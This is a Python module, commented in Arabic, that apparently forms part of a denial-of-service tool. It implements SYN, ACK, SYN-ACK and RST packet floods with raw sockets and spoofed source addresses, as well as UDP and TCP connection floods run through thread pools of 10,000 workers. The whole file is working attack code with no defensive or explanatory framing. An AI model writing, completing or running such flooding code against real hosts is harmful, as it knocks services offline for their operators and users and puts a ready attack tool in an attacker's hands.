#!/usr/bin/env python3
"""
هجمات Layer 4 - طبقة النقل
"""

import socket
import struct
import random
import threading
import time
from concurrent.futures import ThreadPoolExecutor

class Layer4Attacks:
    def __init__(self, killer):
        self.killer = killer
        self.ips = killer.ips
        
    def syn_flood(self, target, port):
        """SYN Flood - إغراق بطلبات اتصال"""
        while self.killer.running:
            try:
                src_ip = random.choice(self.ips)
                
                # بناء باكت SYN
                ip_header = struct.pack(
                    '!BBHHHBBH4s4s',
                    0x45, 0, 0, random.randint(0,65535), 0, 64, 6, 0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(target)
                )
                
                tcp_header = struct.pack(
                    '!HHLLBBHHH',
                    random.randint(1024,65535),
                    port,
                    random.randint(0,4294967295),
                    0,
                    0x50,
                    0x02,
                    random.randint(1024,65535),
                    0,
                    0
                )
                
                packet = ip_header + tcp_header + self.killer.payload_gen.generate(1024)
                
                # إرسال الباكت
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                with ThreadPoolExecutor(max_workers=10000) as executor:
                    for _ in range(10000):
                        executor.submit(sock.sendto, packet, (target, 0))
                        
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
                    self.killer.stats['bytes'] += len(packet) * 10000
            except:
                pass
    
    def ack_flood(self, target, port):
        """ACK Flood - إغراق باكتات ACK"""
        while self.killer.running:
            try:
                src_ip = random.choice(self.ips)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 0x45,0,0,random.randint(0,65535),0,64,6,0,socket.inet_aton(src_ip),socket.inet_aton(target))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535),port,random.randint(0,4294967295),0,0x50,0x10,random.randint(1024,65535),0,0)
                packet = ip_header + tcp_header
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 0))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def syn_ack_flood(self, target, port):
        """SYN-ACK Flood"""
        while self.killer.running:
            try:
                src_ip = random.choice(self.ips)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 0x45,0,0,random.randint(0,65535),0,64,6,0,socket.inet_aton(src_ip),socket.inet_aton(target))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535),port,random.randint(0,4294967295),0,0x50,0x12,random.randint(1024,65535),0,0)
                packet = ip_header + tcp_header
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 0))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def rst_flood(self, target, port):
        """RST Flood"""
        while self.killer.running:
            try:
                src_ip = random.choice(self.ips)
                
                ip_header = struct.pack('!BBHHHBBH4s4s', 0x45,0,0,random.randint(0,65535),0,64,6,0,socket.inet_aton(src_ip),socket.inet_aton(target))
                tcp_header = struct.pack('!HHLLBBHHH', random.randint(1024,65535),port,random.randint(0,4294967295),0,0x50,0x04,random.randint(1024,65535),0,0)
                packet = ip_header + tcp_header
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                for _ in range(10000):
                    sock.sendto(packet, (target, 0))
                    
                sock.close()
                
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def udp_flood(self, target, port):
        """UDP Flood"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.killer.running:
            try:
                with ThreadPoolExecutor(max_workers=10000) as executor:
                    for _ in range(10000):
                        data = self.killer.payload_gen.generate(random.randint(1024, 65535))
                        executor.submit(sock.sendto, data, (target, port))
                        
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
                    self.killer.stats['bytes'] += 65535 * 10000
            except:
                pass
    
    def tcp_flood(self, target, port):
        """TCP Flood"""
        while self.killer.running:
            try:
                with ThreadPoolExecutor(max_workers=10000) as executor:
                    for _ in range(10000):
                        executor.submit(self._tcp_connect, target, port)
                        
                with self.killer.lock:
                    self.killer.stats['packets'] += 10000
            except:
                pass
    
    def _tcp_connect(self, target, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(self.killer.payload_gen.generate(1024))
            s.close()
        except:
            pass
